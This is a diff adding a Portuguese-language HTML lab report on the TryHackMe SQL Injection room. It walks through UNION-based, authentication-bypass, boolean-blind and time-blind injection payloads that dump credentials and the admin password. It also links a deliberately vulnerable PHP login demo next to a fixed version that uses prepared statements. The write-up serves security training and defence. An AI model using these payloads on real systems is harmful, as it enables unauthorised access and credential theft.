@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Relatório de Lab - SQL Injection</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gradient-to-br from-[#0D1121] via-[#1a2238] to-[#283655] text-white font-sans min-h-screen relative">
+  <!-- Background image decorative -->
+  <div class="pointer-events-none fixed inset-0 z-0 flex justify-center items-center">
+    <img src="https://image.lexica.art/full_webp/6957307a-3542-4118-ae89-54a02851ef3d" alt="background" class="opacity-30 w-full h-auto hidden md:block" />
+  </div>
+  <div class="relative z-10 max-w-5xl mx-auto py-12 px-2 md:px-10">
+    <!-- Cabeçalho -->
+    <header class="mb-10">
+      <div class="bg-gradient-to-r from-blue-900 to-blue-600 rounded-xl shadow-lg p-8 flex flex-col items-center">
+        <h1 class="text-4xl md:text-5xl font-extrabold uppercase tracking-widest text-white drop-shadow-lg mb-2">SQL Injection</h1>
+        <p class="text-green-100 text-lg">Relatório de Lab <a href="https://tryhackme.com/room/sqlinjectionlm" class="text-green-600 hover:underline" target="_blank">SQL Injection</a></p>
+        <p class="mt-2 text-sm text-green-50">Data: <span class="font-semibold">Maio de 2025</span></p>
+      </div>
+    </header>
+
+    <!-- Sumário -->
+    <nav class="mb-12">
+      <div class="bg-white rounded-xl shadow p-6 border-l-4 border-blue-700">
+        <h2 class="text-2xl font-bold text-blue-900 mb-4">Sumário</h2>
+        <ul class="space-y-2 text-lg list-disc list-inside">
+          <li><a href="#introducao" class="text-blue-400 hover:underline">Introdução</a></li>
+          <li><a href="#cenario" class="text-blue-400 hover:underline">Cenário do Lab</a></li>
+          <li><a href="#inband" class="text-blue-400 hover:underline">In-Band SQLi</a></li>
+          <li><a href="#blind-auth" class="text-blue-400 hover:underline">Blind SQLi - Authentication Bypass</a></li>
+          <li><a href="#blind-boolean" class="text-blue-400 hover:underline">Blind SQLi - Boolean Based</a></li>
+          <li><a href="#blind-time" class="text-blue-400 hover:underline">Blind SQLi - Time Based</a></li>
+          <li><a href="#bonus" class="text-blue-400 hover:underline">Bônus: Demonstração Prática</a></li>
+          <li><a href="#conclusao" class="text-blue-400 hover:underline">Conclusão e Aprendizados</a></li>
+        </ul>
+      </div>
+    </nav>
+
+    <!-- Seção: Introdução -->
+    <section class="mb-12" id="introducao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Introdução
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Este relatório apresenta a resolução dos labs da Room <strong>SQL Injection</strong> do TryHackMe, parte do módulo de Pentest em aplicações Web. O objetivo é explorar diferentes técnicas de SQL Injection, compreender como vulnerabilidades podem ser exploradas para manipular consultas SQL e acessar informações sensíveis, e reforçar a importância de práticas seguras no desenvolvimento de aplicações web.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Os labs abordam desde ataques In-Band até Blind SQLi, incluindo autenticação bypass, boolean-based e time-based, proporcionando uma visão prática e detalhada das principais técnicas utilizadas por atacantes.
+        </p>
+      </div>
+    </section>
+
+    <!-- Seção: Cenário do Lab -->
+    <section class="mb-12" id="cenario">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Cenário do Lab
+        </h2>
+        <ul class="list-disc pl-6 text-gray-800 text-lg space-y-2">
+          <li>Exploração de SQL Injection em campos de senha, URLs e consultas baseadas em tempo.</li>
+          <li>Manipulação de resultados de consultas para obter informações como usuários, senhas e estrutura do banco de dados.</li>
+          <li>Prática de técnicas como In-Band SQLi, Blind SQLi (Authentication Bypass, Boolean Based, Time Based).</li>
+          <li>Compreensão dos riscos e impactos dessas vulnerabilidades em aplicações web reais.</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Seção: In-Band SQLi -->
+    <section class="mb-12" id="inband">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-2xl font-bold text-blue-900 mb-5">In-Band SQLi</h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          O objetivo deste lab é identificar e explorar vulnerabilidades de SQL Injection baseadas em erros para acessar informações do banco de dados, utilizando a técnica de <strong>Union-based SQL Injection</strong>.
+        </p>
+        <img src="../images/images-sqlInjection/image.png" alt="Tela inicial" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Testando <span class="font-mono bg-gray-100 px-1 rounded">1 UNION SELECT 1,2</span> resulta em erro, mas <span class="font-mono bg-gray-100 px-1 rounded">1 UNION SELECT 1,2,3</span> é sucesso.
+        </p>
+        <img src="../images/images-sqlInjection/image 1.png" alt="Erro union select" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <img src="../images/images-sqlInjection/image 2.png" alt="Sucesso union select" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Manipulando o resultado, é possível descobrir o nome do banco de dados:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">0 UNION SELECT 1,2,database()</pre>
+        <img src="../images/images-sqlInjection/image 3.png" alt="database()" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Listando tabelas e colunas:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'</pre>
+        <img src="../images/images-sqlInjection/image 4.png" alt="Tabelas" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Sabendo que existe uma tabela chamada `staff_users` pode-se descobrir as colunas da tabela com:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'</pre>
+        <img src="../images/images-sqlInjection/image 5.png" alt="Colunas" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Sabendo as colunas, é possivel obter as informações de username e password com:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_users</pre>
+        <img src="../images/images-sqlInjection/image 6.png" alt="Credenciais" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Blind SQLi - Authentication Bypass -->
+    <section class="mb-12" id="blind-auth">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-2xl font-bold text-blue-900 mb-5">Blind SQLi - Authentication Bypass</h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Neste lab, o objetivo é explorar uma vulnerabilidade de SQL Injection para driblar autenticações, manipulando consultas SQL para sempre retornar uma condição verdadeira.
+        </p>
+        <img src="../images/images-sqlInjection/image 7.png" alt="Tela inicial auth bypass" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Inicialmente, pode-se colocar <span class="font-mono bg-gray-100 px-1 rounded">`%username%`</span> e <span class="font-mono bg-gray-100 px-1 rounded">`%password%`</span> nos campos
+        </p>
+        <img src="../images/images-sqlInjection/image 8.png" alt="Campos username password" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+            Ao clicar em Login, exibe ‘no result found’.
+        </p>
+        <img src="../images/images-sqlInjection/image 9.png" alt="No result found" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Utilizando <span class="font-mono bg-gray-100 px-1 rounded">' OR 1=1;--</span> no campo de senha, a condição se torna logicamente sempre verdadeira, permitindo o bypass da autenticação.
+        </p>
+        <img src="../images/images-sqlInjection/image 10.png" alt="Level 3 liberado" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Blind SQLi - Boolean Based -->
+    <section class="mb-12" id="blind-boolean">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-2xl font-bold text-blue-900 mb-5">Blind SQLi - Boolean Based</h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Neste lab, exploramos Blind SQL Injection para descobrir nomes de banco, tabelas, colunas e dados sensíveis, manipulando a URL e analisando respostas booleanas.
+        <p class="text-gray-800 mb-4 text-lg">
+          Na tela inicial, podemos fazer os testes no endpoint <span class="font-mono bg-gray-100 px-1 rounded">/checkuser?username=admin</span>.
+        </p>
+        <img src="../images/images-sqlInjection/image 11.png" alt="Tela inicial boolean" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Testando com <span class="font-mono bg-gray-100 px-1 rounded">admin123' UNION SELECT 1,2,3;--</span> descobrimos que a quantidade de colunas é 3.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Podemos testar com <span class="font-mono bg-gray-100 px-1 rounded">admin123' UNION SELECT 1,2,3 where database() like '%';--</span> que retorna positivo, pois ‘%’ é compatível com qualquer coisa.
+        </p>
+        <img src="../images/images-sqlInjection/image 13.png" alt="database like %" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Para avançar, usamos <span class="font-mono bg-gray-100 px-1 rounded">admin123' UNION SELECT 1,2,3 where database() like 's%';--</span> para verificar se a primeira letra do nome da tabela é ‘s’. O nome é <strong>sqli_three</strong>.
+        </p>
+        <img src="../images/images-sqlInjection/image 14.png" alt="database like s%" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Podemos colocar qualquer letra após o ‘s’ para verificar o erro:
+        </p>
+        <img src="../images/images-sqlInjection/image 15.png" alt="database like erro" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Sabendo o nome da tabela, usamos <span class="font-mono bg-gray-100 px-1 rounded">admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--</span> para verificar a tabela de usuários.
+        </p>
+        <img src="../images/images-sqlInjection/image 16.png" alt="Tabela users" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Para encontrar nome de coluna:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+admin123'
+ UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE 
+TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 
+'a%' and COLUMN_NAME !='id';</pre>
+        <img src="../images/images-sqlInjection/image 17.png" alt="Coluna a%" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Substituindo <span class="font-mono bg-gray-100 px-1 rounded">'a%'</span> por <span class="font-mono bg-gray-100 px-1 rounded">'password'</span> o resultado é positivo.
+        </p>
+        <img src="../images/images-sqlInjection/image 18.png" alt="Coluna password" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Agora sabemos que existe a tabela users e a coluna password. Podemos usar <span class="font-mono bg-gray-100 px-1 rounded">admin123' UNION SELECT 1,2,3 from users where username like 'a%</span> e o resultado é positivo, testando com <span class="font-mono bg-gray-100 px-1 rounded">admin</span> continua positivo.
+        </p>
+        <img src="../images/images-sqlInjection/image 19.png" alt="Usuário admin" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Podemos testar se a senha é admin com <span class="font-mono bg-gray-100 px-1 rounded">admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%</span>, mas o resultado é negativo. A própria room diz que a senha é 3845, podemos verificar com <span class="font-mono bg-gray-100 px-1 rounded">admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3845</span>.
+        </p>
+        <img src="../images/images-sqlInjection/image 20.png" alt="Senha admin" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Blind SQLi - Time Based -->
+    <section class="mb-12" id="blind-time">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-2xl font-bold text-blue-900 mb-5">Blind SQLi - Time Based</h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Neste lab, o objetivo é explorar vulnerabilidades de <strong>Time-Based Blind SQL Injection</strong>, utilizando atrasos no tempo de resposta para inferir informações do banco de dados.
+        </p>
+        <img src="../images/images-sqlInjection/image 21.png" alt="Tela inicial time based" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Começamos os testes com <span class="font-mono bg-gray-100 px-1 rounded">admin123' UNION SELECT SLEEP(5);--</span>.
+        </p>
+        <img src="../images/images-sqlInjection/image 22.png" alt="SLEEP 5 1 coluna" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Usando <span class="font-mono bg-gray-100 px-1 rounded">referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--</span> temos tempo muito curto.
+        </p>
+        <img src="../images/images-sqlInjection/image 23.png" alt="SLEEP 5,2 u%" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Mas com <span class="font-mono bg-gray-100 px-1 rounded">referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--</span> o tempo é maior, resultado positivo.
+        </p>
+        <img src="../images/images-sqlInjection/image 24.png" alt="SLEEP 5,2 s%" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Com tentativa e erro, pode-se descobrir que o nome da database é <strong>sqli_four</strong>.
+        </p>
+        <img src="../images/images-sqlInjection/image 25.png" alt="sqli_four" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Podemos confirmar tabela <span class="font-mono bg-gray-100 px-1 rounded">users</span> e coluna <span class="font-mono bg-gray-100 px-1 rounded">username</span> com:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+referrer=admin123' UNION SELECT SLEEP(5),2 FROM information_schema.columns WHERE table_schema = 'sqli_four' and table_name='users' and column_name='username';--</pre>
+        <img src="../images/images-sqlInjection/image 26.png" alt="Coluna username" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Com <span class="font-mono bg-gray-100 px-1 rounded">column_name='password'</span> o resultado é o mesmo.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Para testar o usuário admin:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+referrer=admin123' UNION SELECT SLEEP(5),2 FROM users where username='admin';--</pre>
+        <img src="../images/images-sqlInjection/image 27.png" alt="Usuário admin" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Usando tentativa e erro, pode-se ir fazendo testes para descobrir a senha com <span class="font-mono bg-gray-100 px-1 rounded">referrer=admin123' UNION SELECT SLEEP(5),2 FROM users where username='admin' and password like '4%';--</span> até completar.
+        </p>
+        <img src="../images/images-sqlInjection/image 28.png" alt="Descobrindo senha" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <img src="../images/images-sqlInjection/image 29.png" alt="Senha encontrada" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Seção: Bônus - Demonstração Prática -->
+    <section class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-green-700" id="bonus">
+      <h2 class="text-3xl font-bold text-green-900 mb-5 flex items-center gap-2">
+        <svg class="w-7 h-7 text-green-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+        Bônus: Demonstração Prática de SQL Injection em PHP
+      </h2>
+      <p class="text-gray-800 mb-4 text-lg">
+        Para ilustrar na prática como uma aplicação pode ser vulnerável a SQL Injection e como corrigir esse problema, desenvolvi um projeto simples em PHP e MySQL. O projeto contém duas versões de login: uma vulnerável e outra corrigida utilizando <strong>prepared statements</strong>.
+      </p>
+      <p class="text-gray-800 mb-4 text-lg">
+          O código-fonte do projeto está disponível publicamente e pode ser utilizado para estudo, testes e aprimoramento de habilidades em segurança da informação: <a href="https://github.com/TheEddu/LoginPage-Vulnerable" class="text-blue-400 hover:underline">aqui</a>
+      </p>
+
+      <ul class="list-disc pl-6 text-gray-800 text-lg mb-4">
+        <li><strong>loginVulneravel.php</strong>: Permite a exploração de SQL Injection, demonstrando como um atacante pode acessar o sistema sem a senha correta.</li>
+        <li><strong>loginCorrigido.php</strong>: Utiliza prepared statements, impedindo a injeção e garantindo a segurança da autenticação.</li>
+      </ul>
+      <p class="text-gray-800 mb-4 text-lg">
+        <strong>Como funciona o ataque:</strong> ao inserir <span class="font-mono bg-gray-100 px-1 rounded">admin' -- </span> no campo de usuário da página vulnerável, o atacante consegue acessar o sistema sem a senha correta, pois o restante da consulta SQL é ignorado.
+      </p>
+      <p class="text-gray-800 mb-4 text-lg">
+        <strong>Como funciona a defesa:</strong> na página corrigida, o mesmo ataque não funciona, pois os dados do usuário são tratados separadamente da consulta SQL.
+      </p>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mt-8">
+        <div>
+          <h3 class="text-xl font-bold text-green-800 mb-2">Demonstração Vulnerável</h3>
+          <video controls class="rounded-lg border border-green-400 shadow w-full">
+            <source src="../videos/sqlInjection-videos/vulneravel.mp4" type="video/mp4">
+            Seu navegador não suporta o vídeo.
+          </video>
+        </div>
+        <div>
+          <h3 class="text-xl font-bold text-green-800 mb-2">Demonstração Corrigida</h3>
+          <video controls class="rounded-lg border border-green-400 shadow w-full">
+            <source src="../videos/sqlInjection-videos/corrigido.mp4" type="video/mp4">
+            Seu navegador não suporta o vídeo.
+          </video>
+        </div>
+      </div>
+      <p class="text-gray-700 mt-4 text-base italic">
+        Este projeto foi criado para fins educacionais e demonstra como implementar boas práticas de segurança em aplicações web.
+      </p>
+    </section>
+
+    <!-- Seção: Conclusão e Aprendizados -->
+    <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700" id="conclusao">
+      <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+        <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+        Conclusão e Aprendizados
+      </h2>
+      <p class="text-gray-800 mt-6 text-lg mb-4">SQL Injection é uma das vulnerabilidades mais comuns em aplicações web, mas pode ser evitada com boas práticas como o uso de prepared statements e validação adequada dos dados de entrada.</p>
+      <ul class="list-disc pl-6 space-y-2 text-lg">
+        <li class="text-gray-800">A prática de SQL Injection evidencia como falhas na validação de entradas podem comprometer sistemas e expor dados sensíveis.</li>
+        <li class="text-gray-800">Técnicas como consultas parametrizadas, validação de entradas e limitação de permissões são essenciais para mitigar riscos.</li>
+        <li class="text-gray-800">O monitoramento e análise de logs ajudam a detectar tentativas de ataque e responder rapidamente a incidentes.</li>
+        <li class="text-gray-800">A segurança de aplicações é um processo contínuo, exigindo atualização constante e educação dos desenvolvedores.</li>
+      </ul>
+      <p class="text-gray-800 mt-6 text-lg">
+        O conhecimento prático dessas técnicas é fundamental para profissionais de segurança, permitindo identificar, explorar e mitigar vulnerabilidades de SQL Injection em ambientes reais.
+      </p>
+    </div>
+
+    <!-- Botão de Voltar -->
+    <div class="text-center mt-12">
+      <a href="../index.html" class="inline-block bg-gradient-to-r from-green-500 to-green-400 text-white font-bold py-3 px-8 rounded-lg shadow hover:from-green-600 hover:to-green-500 transition text-lg">← Voltar aos Labs</a>
+    </div>
+  </div>
+</body>
+</html>
